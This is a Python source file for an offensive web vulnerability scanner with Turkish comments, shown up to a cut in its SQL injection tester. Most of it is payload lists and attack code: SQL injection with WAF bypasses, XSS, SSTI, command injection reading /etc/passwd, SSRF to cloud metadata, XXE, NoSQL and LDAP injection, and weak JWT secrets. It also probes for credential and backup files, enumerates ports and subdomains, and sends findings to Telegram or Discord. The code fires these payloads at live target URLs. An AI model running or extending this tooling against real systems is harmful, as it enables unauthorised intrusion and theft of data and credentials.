#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ProMax Scanner v7.0 ULTRA+
Kurulum (iSH):
    apk update && apk add python3 py3-pip ca-certificates
    update-ca-certificates
    pip3 install requests
    # opsiyonel: pip3 install cloudscraper dnspython

ENV:
    PORTS_MODE=quick|extended|full     (quick:~150, extended:~10000, full:65535)
    SUBS_MODE=quick|extended|full      (quick:~250, extended:~800, full:~1200+)
    SCAN_PROXY=http://127.0.0.1:8080
    SCAN_COOKIE="a=1; b=2"
    TELEGRAM_TOKEN / TELEGRAM_CHAT / DISCORD_WEBHOOK

UYARI: Sadece yetkili olduğun hedeflerde kullan.
"""

import socket, requests, json, time, re, sys, base64, random, urllib.parse
import threading, os, hmac, hashlib, queue, itertools
from datetime import datetime
from urllib.parse import urlparse, parse_qs, quote, urlencode, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FutureTimeout
import urllib3
urllib3.disable_warnings()

import ssl as ssl_module
from requests.adapters import HTTPAdapter

# ============================================================
# TTY CHECK
# ============================================================
_TTY = sys.stdout.isatty()
if _TTY:
    R="\033[91m";G="\033[92m";Y="\033[93m";B="\033[94m";M="\033[95m";C="\033[96m";N="\033[0m";BOLD="\033[1m";CLR="\033[2K\r"
else:
    R=G=Y=B=M=C=N=BOLD=CLR=""

# ============================================================
# OPSİYONEL
# ============================================================
try:
    import cloudscraper; CLOUDSCRAPER_AVAILABLE=True
except ImportError: CLOUDSCRAPER_AVAILABLE=False
try:
    import dns.resolver, dns.query, dns.zone
    DNS_AVAILABLE=True
except ImportError: DNS_AVAILABLE=False

TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN","")
TELEGRAM_CHAT  = os.environ.get("TELEGRAM_CHAT","")
DISCORD_WEBHOOK= os.environ.get("DISCORD_WEBHOOK","")
SCAN_PROXY     = os.environ.get("SCAN_PROXY","")
SCAN_COOKIE    = os.environ.get("SCAN_COOKIE","")
PORTS_MODE     = os.environ.get("PORTS_MODE","quick").lower()
SUBS_MODE      = os.environ.get("SUBS_MODE","quick").lower()

# ============================================================
# UA POOL
# ============================================================
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",
]

# ============================================================
# FILE LOGGER
# ============================================================
class FileLogger:
    def __init__(self, path):
        self.path = path
        self.lock = threading.Lock()
        self.f = open(path, "a", encoding="utf-8", buffering=1)
        self.f.write(f"\n\n# ====== Scan v7.0 started: {datetime.now().isoformat()} ======\n")
    def log(self, msg, level="info"):
        with self.lock:
            ts = datetime.now().strftime("%H:%M:%S")
            try: self.f.write(f"[{ts}][{level.upper()}] {msg}\n")
            except Exception: pass
    def raw(self, text):
        with self.lock:
            try: self.f.write(text + "\n")
            except Exception: pass
    def close(self):
        with self.lock:
            try:
                self.f.write(f"\n# ====== Scan finished: {datetime.now().isoformat()} ======\n")
                self.f.close()
            except Exception: pass

# ============================================================
# RATE LIMITER
# ============================================================
class RateLimiter:
    def __init__(self, max_per_sec):
        self.delay = 1.0 / max(1, max_per_sec)
        self.lock = threading.Lock()
        self.last = 0.0
    def wait(self):
        with self.lock:
            now = time.time()
            el = now - self.last
            if el < self.delay: time.sleep(self.delay - el)
            self.last = time.time()
    def set_rate(self, max_per_sec):
        with self.lock:
            self.delay = 1.0 / max(1, max_per_sec)

# ============================================================
# SESSION POOL
# ============================================================
class SessionPool:
    def __init__(self, bypass=False, headers=None, proxy=None):
        self.local = threading.local()
        self.bypass = bypass
        self.headers = headers or {}
        self.proxy = proxy
    def get(self):
        if not hasattr(self.local, "session"):
            if self.bypass and CLOUDSCRAPER_AVAILABLE:
                s = cloudscraper.create_scraper(
                    browser={"browser":"chrome","platform":"windows","desktop":True})
            else:
                s = requests.Session()
            a = HTTPAdapter(pool_connections=4, pool_maxsize=40, max_retries=0)
            s.mount("https://", a); s.mount("http://", a)
            s.headers.update(self.headers)
            if self.proxy:
                s.proxies = {"http": self.proxy, "https": self.proxy}
            s.trust_env = False
            self.local.session = s
        return self.local.session

# ============================================================
# NOTIFIER (rate-limited worker)
# ============================================================
class Notifier:
    def __init__(self):
        self.q = queue.Queue(maxsize=500)
        self.stop = False
        self.worker = None
        if TELEGRAM_TOKEN or DISCORD_WEBHOOK:
            self.worker = threading.Thread(target=self._run, daemon=True)
            self.worker.start()
    def send(self, msg):
        if not self.worker: return
        try: self.q.put_nowait(msg[:3500])
        except queue.Full: pass
    def _run(self):
        while not self.stop:
            try: msg = self.q.get(timeout=2)
            except queue.Empty: continue
            try:
                if TELEGRAM_TOKEN and TELEGRAM_CHAT:
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                        json={"chat_id":TELEGRAM_CHAT,"text":msg}, timeout=5)
            except Exception: pass
            try:
                if DISCORD_WEBHOOK:
                    requests.post(DISCORD_WEBHOOK, json={"content":msg}, timeout=5)
            except Exception: pass
            try: self.q.task_done()
            except Exception: pass
            time.sleep(0.5)  # flood koruması
    def close(self):
        self.stop = True
        if self.worker:
            try: self.worker.join(timeout=3)
            except Exception: pass

# ============================================================
# PAYLOADS (v7 genişletilmiş)
# ============================================================
SQLI_ERROR_PAYLOADS = [
    "'", "\"", "'\"", "')", "\")", "';", "\";",
    "' OR '1", "\" OR \"1", "' OR 1=1-- -", "\" OR 1=1-- -",
    "1'", "1\"", "1')", "1\")", "1;", "1';",
    "' AND 1=CONVERT(int, @@version)-- -",
    "' AND extractvalue(1,concat(0x7e,version()))-- -",
    "' AND updatexml(1,concat(0x7e,version()),1)-- -",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "1' AND 1=1-- -", "1' AND '1'='1",
    "\" AND \"1\"=\"1", "') OR ('1'='1",
    "' OR 'x'='x", "1 OR 1=1",
    "' AND 1=1 AND '1'='1", "' AND 1=2 AND '1'='1",
]

SQLI_TIME_PAYLOADS = [
    ("' OR SLEEP({d})-- -", "MySQL"),
    ("' OR SLEEP({d})#", "MySQL"),
    ("') OR SLEEP({d})-- -", "MySQL"),
    ("' OR pg_sleep({d})-- -", "PostgreSQL"),
    ("'; SELECT pg_sleep({d})-- -", "PostgreSQL"),
    ("' WAITFOR DELAY '0:0:{d}'-- -", "MSSQL"),
    ("'; WAITFOR DELAY '0:0:{d}'-- -", "MSSQL"),
    ("' AND SLEEP({d}) AND '1'='1", "MySQL"),
    ("1 AND SLEEP({d})", "MySQL"),
    ("1) AND SLEEP({d})-- -", "MySQL"),
    ("1 AND 1=1;SELECT pg_sleep({d})--", "PostgreSQL"),
    ("';BEGIN DBMS_LOCK.SLEEP({d});END;-- -", "Oracle"),
]

SQLI_BOOL_PAIRS = [
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ("' AND '1'='1", "' AND '1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
]

SQLI_DB_VERSION = {
    "MySQL": "' UNION SELECT @@version,{padding}-- -",
    "PostgreSQL": "' UNION SELECT version(),{padding}-- -",
    "MSSQL": "' UNION SELECT @@version,{padding}-- -",
    "Oracle": "' UNION SELECT banner,{padding} FROM v$version-- -",
}

SQLI_WAF_BYPASS = [
    "'/**/OR/**/1=1-- -",
    "' /*!OR*/ 1=1-- -",
    "' oR 1=1-- -",
    "' Or 1=1-- -",
    "' UNION/**/SELECT/**/NULL-- -",
    "'%09OR%091=1-- -",
    "%27%20OR%201%3D1--%20",
    "'+OR+1=1--+-",
    "' OR/**/SLEEP(5)-- -",
]

SQL_ERROR_SIGS = {
    "MySQL": [r"SQL syntax.*MySQL", r"Warning.*mysql_", r"valid MySQL result",
              r"MySqlClient\.", r"com\.mysql\.jdbc", r"MySQLSyntaxErrorException",
              r"check the manual that corresponds to your (MySQL|MariaDB) server version"],
    "PostgreSQL": [r"PostgreSQL.*ERROR", r"Warning.*pg_", r"valid PostgreSQL result",
                   r"Npgsql\.", r"org\.postgresql\.util\.PSQLException",
                   r"ERROR:\s+syntax error at or near"],
    "MSSQL": [r"Driver.*SQL[\-\_\ ]*Server", r"OLE DB.*SQL Server",
              r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_",
              r"ODBC SQL Server Driver", r"SQLServer JDBC Driver",
              r"Unclosed quotation mark after the character string"],
    "Oracle": [r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_",
               r"Warning.*\Wora_", r"ORA-\d{5}"],
    "SQLite": [r"SQLite/JDBCDriver", r"SQLite\.Exception",
               r"System\.Data\.SQLite\.SQLiteException", r"SQLite3::"],
    "generic": [r"SQL syntax error", r"SQL command not properly ended",
                r"SQLSTATE\[", r"PDOException", r"unclosed quotation mark"],
}

XSS_PAYLOADS = [
    '<script>alert(1)</script>', '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>", '<svg/onload=alert(1)>',
    '<iframe src=javascript:alert(1)>', '<body onload=alert(1)>',
    '<img src=x onerror=alert(1)>', '<details open ontoggle=alert(1)>',
    "'-alert(1)-'", "javascript:alert(1)", "';alert(1);//",
]

SSTI_PAYLOADS = [
    ("{{7*7}}","49"), ("${7*7}","49"), ("#{7*7}","49"),
    ("<%= 7*7 %>","49"), ("{{7*'7'}}","7777777"),
]

SSTI_DEEP = [
    ("{{config}}","SECRET_KEY"), ("{{self}}","TemplateReference"),
    ("{{ ''.__class__ }}","<class"), ("{% debug %}","settings"),
    ("${7*7}","49"), ("#{7*7}","49"),
]

PATH_TRAV = [
    ("../../../../etc/passwd","root:x:"),
    ("....//....//....//etc/passwd","root:x:"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","root:x:"),
    ("..\\..\\..\\windows\\win.ini","[extensions]"),
    ("..%252f..%252f..%252fetc%252fpasswd","root:x:"),
    ("/etc/passwd%00","root:x:"),
    ("/proc/self/environ","HTTP_USER_AGENT"),
    ("php://filter/convert.base64-encode/resource=index.php","PD9waHA"),
]

CMDI_PAYLOADS = [
    ("; id","uid="), ("| id","uid="), ("&& id","uid="), ("`id`","uid="),
    ("$(id)","uid="), ("; cat /etc/passwd","root:x:"),
    ("| ping -c 1 127.0.0.1","bytes from"),
    ("%0Aid","uid="), ("%0aid","uid="),
]

CMDI_TIME_PAYLOADS = [
    "; sleep 5", "| sleep 5", "&& sleep 5", "`sleep 5`",
    "$(sleep 5)", "%0Asleep%205", "; ping -c 5 127.0.0.1",
]

SSRF_TARGETS = [
    ("http://169.254.169.254/latest/meta-data/",["ami-id","placement/","iam/"]),
    ("http://169.254.169.254/latest/user-data",["#cloud-config","#!/bin/"]),
    ("http://169.254.169.254/metadata/v1/",["droplet_id"]),
    ("http://metadata.google.internal/computeMetadata/v1/",["project"]),
    ("http://100.100.100.200/latest/meta-data/",["instance-id"]),
    ("file:///etc/passwd",["root:x:"]),
    ("gopher://127.0.0.1:6379/_INFO",["redis_version"]),
]

XXE_PAYLOADS = [
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',["root:x:"]),
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>',["[extensions]"]),
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://127.0.0.1:80/"> %p;]><r/>',["refused"]),
    ('<?xml version="1.0"?><r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></r>',["root:x:"]),
    ('<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',["root:x:"]),
]

NOSQL_PAYLOADS = [
    ('{"$ne":null}', '{"$ne":null}'),
    ('{"$gt":""}',   '{"$gt":""}'),
    ('{"$where":"1==1"}', '{"$where":"sleep(5000)"}'),
    ('{"username":{"$ne":1},"password":{"$ne":1}}', '{"username":"x","password":"x"}'),
    ('{"username":{"$regex":"^a"}}', '{"username":"zzz_no_match"}'),
]

LDAP_ERROR_SIGS = [
    r"LDAP.*invalid", r"LDAP.*error", r"javax\.naming\.directory",
    r"ldap_search", r"Protocol error.*LDAP", r"ldap_bind",
]

LDAP_PAYLOADS = ["*)(uid=*))(|(uid=*", "admin)(|(password=*", "*", "*))%00"]

XPATH_PAYLOADS = ["' or '1'='1", "'] | //* | //*['",
                  "' or count(parent::*[position()=1])=0 or 'a'='b"]

DESERIALIZATION_SIGS = {
    "Java rO0AB":   (["rO0AB"], ["x-java-serialized","java-serialized"]),
    "PHP serialize":(['a:1:{', 'O:8:"stdClass"'], ["php"]),
    "Python pickle":(["gASV","gAJ"], ["application/x-python"]),
    ".NET ViewState":(["__VIEWSTATE"], ["asp.net","viewstate"]),
    "Ruby Marshal":(["BAhT"], ["ruby"]),
}

CMS_FINGERPRINTS = {
    "WordPress":["wp-content","wp-includes","wp-json"],
    "Joomla":["/components/com_","Joomla!"],
    "Drupal":["Drupal.settings","/sites/default/files/"],
    "Magento":["Mage.Cookies","skin/frontend/"],
    "Shopify":["cdn.shopify.com"],
    "PrestaShop":["prestashop","/themes/classic/"],
    "Laravel":["laravel_session","XSRF-TOKEN"],
    "Django":["csrftoken"],
    "Rails":["_rails_session","X-Runtime"],
    "Ghost":["ghost-","ghost.org"],
    "TYPO3":["typo3conf","typo3temp"],
    "CraftCMS":["Craft CMS"],
    "Strapi":["strapi"],
}

TAKEOVER_MAP = {
    r"github\.io": ["There isn't a GitHub Pages site here"],
    r"herokuapp\.com": ["Heroku | No such app","No such app"],
    r"s3[\.\-]": ["NoSuchBucket","The specified bucket does not exist"],
    r"cloudfront\.net": ["The request could not be satisfied"],
    r"fastly\.net": ["Fastly error: unknown domain"],
    r"azurewebsites\.net": ["404 Web Site not found"],
    r"readthedocs\.io": ["The page you are looking for is not here"],
    r"zendesk\.com": ["Help Center Closed"],
    r"tumblr\.com": ["There's nothing here"],
    r"wordpress\.com": ["Do you want to register"],
    r"netlify\.app": ["Not Found - Request ID"],
    r"surge\.sh": ["project not found"],
    r"pantheonsite\.io": ["The gods are wise"],
    r"bitbucket\.io": ["Repository not found"],
    r"ghost\.io": ["Domain is not configured"],
    r"webflow\.io": ["The page you are looking for doesn't exist"],
    r"shopify\.com": ["Sorry, this shop is currently unavailable"],
}

SENSITIVE_PATTERNS = {
    "AWS Access Key": r'AKIA[0-9A-Z]{16}',
    "AWS Secret":     r'(?i)aws(.{0,20})?[\'"][0-9a-zA-Z/+]{40}[\'"]',
    "Google API":     r'AIza[0-9A-Za-z\-_]{35}',
    "Google OAuth":   r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',
    "Slack Token":    r'xox[baprs]-[0-9a-zA-Z\-]{10,}',
    "GitHub Token":   r'gh[pousr]_[A-Za-z0-9_]{36,}',
    "Stripe Live":    r'sk_live_[0-9a-zA-Z]{24,}',
    "Stripe Test":    r'sk_test_[0-9a-zA-Z]{24,}',
    "Private Key":    r'-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----',
    "JWT":            r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+',
    "SendGrid":       r'SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}',
    "Mailgun":        r'key-[0-9a-zA-Z]{32}',
    "Twilio":         r'SK[0-9a-fA-F]{32}',
    "Basic Auth URL": r'https?://[^/\s:@]+:[^\s:@]+@[^\s]+',
    "Slack Webhook":  r'hooks\.slack\.com/services/[A-Z0-9/]+',
    "Facebook Token": r'EAACEdEose0cBA[0-9A-Za-z]+',
}

JWT_WEAK_SECRETS = [
    "secret","password","123456","jwt","admin","key","token",
    "mysecret","supersecret","changeme","default","test",
    "jwt_secret","JWT_SECRET","your-256-bit-secret","jwtkey","topsecret",
]

BACKUP_NAMES = [
    "index","config","wp-config","settings","database","db","backup","admin",
    ".env","credentials","users","dump","local","secret","production",
    "config.php","database.sql","db.sql","backup.sql","dump.sql",
    "wp-config.php","wp-config.bak","settings.py","local_settings.py",
    "application.yml","application.properties","appsettings.json",
    ".env.local",".env.production",".env.backup",".env.dev",
    "id_rsa","id_dsa",".htpasswd",".htaccess","web.config",
    "aws.json","s3.json","credentials.json","gcp.json","service-account.json",
    "backup.sql.gz","backup.tar.gz","backup.zip","dump.sql.gz","db_backup.sql",
    "site_backup.zip","files.tar.gz","www.zip","public_html.zip",
    "index.php.bak","index.html.bak","config.old","config.txt",
    "composer.lock","package-lock.json","yarn.lock","Gemfile.lock",
    "phpinfo.php","test.php","info.php","shell.php","upload.php",
    ".bash_history",".zsh_history",".mysql_history",
    "wp-config.php.old","wp-config.php.save","wp-config.php.swp",
    ".env.old",".env.bak",".env.save",".env.txt",
]

BACKUP_EXTS = [".bak",".backup",".old",".orig",".save",".swp",".tmp","~",
               ".zip",".tar.gz",".sql",".7z",".rar",".txt",".tgz",".tar",".gz",
               ".php.bak",".php.old",".php~",".php.save"]

# ============================================================
# PORT LİSTELERİ — idempotent üretici
# ============================================================
QUICK_PORTS = [
    21,22,23,25,53,80,81,110,111,135,139,143,389,443,445,465,
    512,513,514,548,587,631,636,873,993,995,1080,1099,1433,
    1521,1723,2049,2082,2083,2086,2087,2181,2222,2375,2379,
    3000,3128,3260,3306,3389,3690,4000,4369,4443,5000,5001,
    5432,5555,5601,5672,5800,5900,5984,5985,5986,6379,6443,
    7000,7001,7077,7474,8000,8001,8008,8009,8080,8081,8086,
    8088,8090,8091,8161,8180,8200,8222,8280,8333,8443,8444,
    8500,8529,8530,8531,8834,8880,8888,8983,9000,9001,9042,
    9060,9080,9090,9091,9092,9100,9160,9200,9300,9418,9443,
    9600,9800,9981,9999,10000,10250,10255,10443,11211,11311,
    15672,16379,18080,20000,25565,27017,27018,28017,
    30000,32768,32769,32770,32771,32772,32773,32774,32775,
    49152,49153,49154,49155,49156,49157,49158,49159,49160,
    49161,49162,49163,49164,49165,49166,49167,49168,49169,
]

def build_ports(mode):
    """Idempotent: aynı mod aynı listeyi üretir."""
    if mode == "full":
        return list(range(1, 65536))
    if mode == "extended":
        base = list(range(1, 10001))
        high = [10001,10010,10100,10200,10300,10400,10500,10600,10700,10800,10900,
                11000,11100,11200,11300,11400,11500,11600,11700,11800,11900,
                12000,12100,12200,12300,12400,12500,13000,14000,15000,16000,
                17000,18000,19000,20000,21000,22000,23000,24000,25000,26000,
                27000,28000,29000,30000,31000,32000,32760,32761,32762,32763,
                32764,32765,32766,32767,32768,32769,32770,32771,32772,32773,
                32774,32775,32776,32777,32778,32779,32780,32781,32782,32783,
                32784,32785,40000,41000,42000,43000,44000,45000,46000,47000,
                48000,49000,49152,49153,49154,49155,49156,49157,49158,49159,
                49160,49161,49162,49163,49164,49165,49166,49167,49168,49169,
                50000,51000,52000,53000,54000,55000,56000,57000,58000,59000,
                60000,61000,62000,63000,64000,65000,65535]
        return sorted(set(base + high))
    return list(QUICK_PORTS)

# ============================================================
# SUBDOMAIN — idempotent üretici
# ============================================================
BASE_SUBS = [
    "www","mail","ftp","dev","test","stage","staging","api","admin","cdn",
    "static","blog","shop","docs","support","demo","backup","old","new",
    "beta","alpha","preprod","uat","qa","vpn","secure","portal","gateway",
    "edge","internal","office","remote","db","mysql","postgres","mongodb",
    "redis","elastic","search","analytics","monitor","grafana","kibana",
    "prometheus","jenkins","git","svn","ci","cd","deploy","build","artifact",
    "registry","auth","oauth","sso","login","signin","app","mobile","m",
    "partner","affiliate","vendor","customer","ecommerce","store","cart",
    "payment","pay","news","media","video","images","img","css","js","fonts",
    "icons","assets","cache","wiki","help","faq","forum","community",
    "career","jobs","info","about","contact","calendar","meet","chat",
    "email","smtp","pop","imap","webmail","exchange","autodiscover",
    "cpanel","whm","plesk","webdisk","mysqladmin","phpmyadmin","pma",
    "adminer","sqladmin","webmin","ns1","ns2","ns3","ns4","ns5",
    "dns1","dns2","mx","mx1","mx2","smtp1","smtp2","mail1","mail2",
    "pop3","imap1","dev-api","test-api","staging-api","prod-api",
    "api-v1","api-v2","api-v3","api-v4","api-dev","api-test","api-staging",
    "api-prod","internal-api","private-api","public-api","partner-api",
    "admin-panel","admin-console","admin-dashboard","admin-portal",
    "control","manage","manager","staff","hr","finance","legal","audit",
    "security","soc","noc","it","ops","devops","sre","platform","infra",
    "cloud","aws","azure","gcp","k8s","docker","rancher","consul","vault",
    "etcd","zookeeper","kafka","rabbitmq","elasticsearch","logstash",
    "jaeger","zipkin","loki","influxdb","clickhouse","cassandra","mariadb",
    "oracle","mssql","minio","ceph","nfs","backup1","backup2","archive",
    "snapshot","media1","images1","assets1","static1","cdn1","cdn2",
    "edge1","download","downloads","upload","uploads","files","file",
    "storage","s3","blob","gcs","shopify","woocommerce","magento",
    "prestashop","squarespace","wix","webflow","ghost","wordpress","wp",
    "wp-admin","drupal","joomla","typo3","strapi","contentful","api-gateway",
    "kong","tyk","traefik","nginx","haproxy","envoy","istio","linkerd",
    "auth0","okta","keycloak","cas","saml","oauth2","oidc","openid","jwt",
    "tokens","staging1","staging2","prod","production","live","origin",
    "main","primary","secondary","master","replica","cluster","node1",
    "node2","worker1","worker2","queue","cron","scheduler","task","jobs",
    "batch","etl","pipeline","airflow","argo","spinnaker","status","health",
    "ping","metrics","logs","trace","dev1","dev2","dev3","test1","test2",
]

def _build_extra_subs():
    """Önek-ek kombinasyonları. Idempotent."""
    extra = set()
    prefixes = ["dev","test","stg","stage","prod","beta","alpha","qa","uat",
                "demo","sandbox","preview","int","internal","ext","external"]
    bases = ["api","app","admin","portal","web","www","shop","blog","docs",
             "cdn","static","mail","auth","oauth","db","jenkins","git",
             "grafana","prometheus","kibana","elastic","kafka","redis",
             "monitor","status","health","panel","dashboard"]
    for p in prefixes:
        for b in bases:
            extra.add(f"{p}-{b}")
            extra.add(f"{p}{b}")
    return extra

def _build_numeric_subs():
    extra = set()
    for base in ["api","app","admin","web","node","srv","db","mail","cdn"]:
        for n in range(1, 21):
            extra.add(f"{base}{n}")
            extra.add(f"{base}-{n}")
    return extra

def _build_suffix_subs():
    extra = set()
    for base in BASE_SUBS[:150]:
        for suffix in ("-dev","-test","-staging","-prod","-new","-old","-backup"):
            extra.add(base + suffix)
    return extra

# Cache: bir kere hesapla
_SUBS_EXT_CACHE = None
_SUBS_FULL_CACHE = None

def build_subs(mode):
    """Idempotent: aynı mod aynı listeyi üretir."""
    global _SUBS_EXT_CACHE, _SUBS_FULL_CACHE
    if mode == "full":
        if _SUBS_FULL_CACHE is None:
            s = set(BASE_SUBS) | _build_extra_subs() | _build_numeric_subs() | _build_suffix_subs()
            _SUBS_FULL_CACHE = sorted(s)
        return list(_SUBS_FULL_CACHE)
    if mode == "extended":
        if _SUBS_EXT_CACHE is None:
            s = set(BASE_SUBS) | _build_extra_subs()
            _SUBS_EXT_CACHE = sorted(s)
        return list(_SUBS_EXT_CACHE)
    return list(BASE_SUBS)

# ============================================================
# SQLi TESTER
# ============================================================
class SQLiTester:
    def __init__(self, scanner):
        self.s = scanner

    def _check_errors(self, text):
        if not text: return None
        specific = {}; generic_hit = 0
        for db, sigs in SQL_ERROR_SIGS.items():
            for sig in sigs:
                if re.search(sig, text, re.IGNORECASE):
                    if db == "generic": generic_hit += 1
                    else: specific[db] = specific.get(db, 0) + 1
        if specific:
            return max(specific, key=specific.get)
        if generic_hit >= 2:  # en az 2 imza
            return "generic"
        return None

    def scan(self, url, params):
        if not params: return
        base_url = url.split("?")[0]
        samples = []
        for _ in range(3):
            t0 = time.time()
            self.s.get(base_url, timeout=8, category="attack")
            samples.append(time.time() - t0)
        bl_mean = sum(samples)/len(samples); bl_max = max(samples)
        base = self.s.get(base_url, timeout=8, category="attack")
        if base is None: return
        base_len = len(base.text); base_code = base.status_code

        for p in params[:2]:
            for fn in (self._error_based, self._time_based, self._boolean_based,
                       self._union_based, self._waf_bypass):
                try:
                    if fn is self._time_based: fn(base_url, p, bl_mean, bl_max)
                    elif fn is self._boolean_based: fn(base_url, p, base_len, base_code)
                    elif fn is self._union_based: fn(base_url, p, base_len, base_code)
                    else: fn(base_url, p)
                except Exception as e:
                    self.s.logger.log(f"SQLi {fn.__name__}: {e}", "error")

    def _error_based(self, base_url, p):
        for payload in SQLI_ERROR_PAYLOADS:
            test_url = f"{base_url}?{p}={quote(payload, safe='')}"
            r = self.s.get(test_url, timeout=8, category="attack")
            if not r: continue
            db = self._check_errors(r.text)
            if db:
                with self.s.lock:
                    self.s.results["sqli_tests"].append({"url": test_url, "payload": payload, "db": db, "status": "ERROR-BASED"})
                    self.s.results["vulns"].append({"url": test_url, "type": f"Error-based SQLi ({db})"})
                self.s.log(f"SQLi Error [{db}]: {p}", "critical")
                self.s.notifier.send(f"[SQLi {db}] {test_url}")
                return

    def _time_based(self, base_url, p, bl_mean, bl_max, delay=5):
        threshold = max(bl_mean + delay*0.8, bl_max + delay*0.6)
        for tmpl, db in SQLI_TIME_PAYLOADS:
            payload = tmpl.format(d=delay)
            test_url = f"{base_url}?{p}={quote(payload, safe='')}"
            t0 = time.time(); self.s.get(test_url, timeout=min(30, delay+10), category="attack")
            el = time.time() - t0
            if el > threshold * 0.85:
                t1 = time.time(); self.s.get(test_url, timeout=min(30, delay+10), category="attack")
                el2 = time.time() - t1
                if el2 > threshold * 0.85:
                    with self.s.lock:
                        self.s.results["blind_sqli_tests"].append({
                            "url": test_url, "payload": payload, "db": db,
                            "elapsed": round(el,2), "elapsed2": round(el2,2),
                            "baseline": round(bl_mean,2), "status": "TIME-CONFIRMED"})
                        self.s.results["vulns"].append({"url": test_url, "type": f"Time Blind SQLi ({db})"})
                    self.s.log(f"Time SQLi [{db}]: {p} {el:.1f}s/{el2:.1f}s", "critical")
                    self.s.notifier.send(f"[Time SQLi {db}] {test_url}")
                    return

    def _boolean_based(self, base_url, p, base_len, base_code):
        confirmed = 0
        for t_payload, f_payload in SQLI_BOOL_PAIRS:
            tu = f"{base_url}?{p}={quote(t_payload, safe='')}"
            fu = f"{base_url}?{p}={quote(f_payload, safe='')}"
            rt = self.s.get(tu, timeout=8, category="attack")
            rf = self.s.get(fu, timeout=8, category="attack")
            if not rt or not rf: continue
            len_diff = abs(len(rt.text) - len(rf.text))
            code_diff = (rt.status_code != rf.status_code)
            t_close = abs(len(rt.text) - base_len)
            f_far   = abs(len(rf.text) - base_len)
            if (len_diff > 150 or code_diff) and t_close < f_far:
                confirmed += 1
            if confirmed >= 2:
                with self.s.lock:
                    self.s.results["sqli_tests"].append({"url": tu, "payload": t_payload, "confirmed": confirmed, "status": "BOOLEAN"})
                    self.s.results["vulns"].append({"url": tu, "type": f"Boolean SQLi ({p})"})
                self.s.log(f"Boolean SQLi: {p}", "critical")
                self.s.notifier.send(f"[Boolean SQLi] {tu}")
                return

    def _union_based(self, base_url, p, base_len, base_code):
        cols = None
        for n in range(1, 16):
            payload = f"' ORDER BY {n}-- -"
            r = self.s.get(f"{base_url}?{p}={quote(payload, safe='')}", timeout=8, category="attack")
            if not r: continue
            if r.status_code != base_code or re.search(r"(unknown column|order by)", r.text, re.I):
                cols = n - 1; break
        if not cols or cols < 1:
            for n in range(1, 11):
                payload = "' UNION SELECT " + ",".join(["NULL"]*n) + "-- -"
                r = self.s.get(f"{base_url}?{p}={quote(payload, safe='')}", timeout=8, category="attack")
                if r and r.status_code == base_code and abs(len(r.text)-base_len) > 80:
                    cols = n; break
        if not cols: return
        for db, tmpl in SQLI_DB_VERSION.items():
            padding = ",".join(["NULL"]*(cols-1)) if cols > 1 else ""
            payload = tmpl.format(padding=padding)
            r = self.s.get(f"{base_url}?{p}={quote(payload, safe='')}", timeout=8, category="attack")
            if r and r.status_code == base_code:
                m = re.search(r'([\d]+\.[\d]+\.[\d]+[^\s<\'"]*)', r.text)
                if m:
                    with self.s.lock:
                        self.s.results["sqli_tests"].append({
                            "url": f"{base_url}?{p}=...", "db": db, "columns": cols,
                            "version": m.group(1), "status": "UNION"})
                        self.s.results["vulns"].append({
                            "url": f"{base_url}?{p}=...", "type": f"UNION SQLi ({db} v{m.group(1)})"})
                    self.s.log(f"UNION SQLi [{db} v{m.group(1)}]", "critical")
                    return

    def _waf_bypass(self, base_url, p):
        for payload in SQLI_WAF_BYPASS:
            test_url = f"{base_url}?{p}={quote(payload, safe='')}"
            r = self.s.get(test_url, timeout=8, category="attack")
            if not r: continue
            db = self._check_errors(r.text)
            if db:
                with self.s.lock:
                    self.s.results["sqli_tests"].append({"url": test_url, "payload": payload, "db": db, "status": "WAF-BYPASS"})
